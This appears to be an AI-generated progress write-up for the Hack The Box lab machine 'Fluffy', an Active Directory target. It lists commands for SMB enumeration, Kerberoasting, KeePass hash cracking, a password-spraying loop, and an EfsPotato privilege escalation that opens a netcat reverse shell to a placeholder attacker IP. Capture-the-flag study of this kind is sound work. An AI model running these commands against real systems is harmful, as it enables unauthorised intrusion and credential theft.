# **HTB Fluffy Write-Up: Progress Summary**

### **Machine Overview**
- **Name**: Fluffy  
- **OS**: Windows (Active Directory)  
- **Difficulty**: Easy  
- **Key Techniques**: Kerberoasting, SMB Enumeration, KeePass Exploitation, Certificate Abuse  

---

## **Steps Taken So Far**

### **1. Initial Enumeration**
#### **SMB Share Discovery**
- Used `smbclient` and `nxc` to explore shares:
  ```bash
  smbclient -L //10.10.11.69 -U 'fluffy.htb\j.fleischman%J0elTHEM4n1990!'
  ```
- Found **IT share** with write access:
  ```
  Everything-1.4.1.1026.x64.zip  
  KeePass-2.58.zip  
  EfsPotato.exe  
  Upgrade_Notice.pdf  
  ```

#### **Kerberoasting Attempt**
- Requested TGS tickets for service accounts:
  ```bash
  impacket-GetUserSPNs fluffy.htb/j.fleischman:'J0elTHEM4n1990!' -dc-ip 10.10.11.69 -request -outputfile kerb_hashes.txt
  ```
- **Service Accounts Found**:
  - `ca_svc` (AD Certificate Services)
  - `winrm_svc` (WinRM Service)
  - `ldap_svc` (LDAP Service)

- **Cracking Attempts**:
  - Ran `hashcat` with `rockyou.txt` → **No success**.
  - Tried custom wordlists (e.g., `Fluffy2025!`, `P@ssw0rd123`) → **Still no crack**.

---

### **2. Exploring Alternative Paths**
#### **Everything Search Tool Analysis**
- Extracted strings from `everything.exe`:
  ```bash
  strings everything.exe | grep -i "c:\\\\users\\\\" > paths.txt
  ```
- **Goal**: Find KeePass database paths (e.g., `C:\Users\Administrator\Documents\Passwords.kdbx`).

#### **KeePass Exploitation**
- Extracted `KeePass-2.58.zip`:
  ```bash
  unzip KeePass-2.58.zip
  ```
- Searched for KeePass configs:
  ```bash
  grep -r "RecentFiles" KeePass-2.58/
  ```
- **If found**: Use `keepass2john` to extract hashes.

#### **EfsPotato.exe (Privilege Escalation)**
- **Possible Use**:
  ```bash
  EfsPotato.exe -i -e "whoami /priv"
  ```
- Checks for **SeImpersonatePrivilege** abuse (similar to JuicyPotato).

---

### **3. Next Steps**
#### **If Kerberoasting Fails**
1. **Password Spraying** (Try common service account passwords):
   ```bash
   for user in ca_svc winrm_svc ldap_svc; do
       for pass in 'Fluffy@2025!' 'P@ssw0rd123' 'Service123!'; do
           crackmapexec winrm 10.10.11.69 -u $user -p $pass -d fluffy.htb
       done
   done
   ```

2. **Check for AS-REP Roastable Accounts**:
   ```bash
   impacket-GetNPUsers fluffy.htb/ -usersfile users.txt -dc-ip 10.10.11.69
   ```

#### **If KeePass Database is Found**
1. **Extract Hash**:
   ```bash
   keepass2john Passwords.kdbx > keepass.hash
   hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
   ```

2. **Open KeePass DB** (If cracked):
   ```bash
   kpcli --kdb Passwords.kdbx --keyfile keyfile.key
   ```

#### **If EfsPotato Works**
- **Privilege Escalation**:
  ```bash
  EfsPotato.exe -i -e "nc.exe -e cmd YOUR_IP 4444"
  ```

---

## **Conclusion**
### **Current Status**
- **Kerberoasting**: Hashes obtained but not cracked yet.
- **KeePass Database**: Still searching for `.kdbx` file.
- **EfsPotato**: Potential privilege escalation path.

### **Next Moves**
1. **Find KeePass DB** (Check `C:\Users\*\AppData\Local\Everything\*.db`).
2. **Password Spraying** (Try `winrm_svc` with common passwords).
3. **Exploit EfsPotato** if initial shell is obtained.

Would you like a deeper dive into any of these steps? 🚀
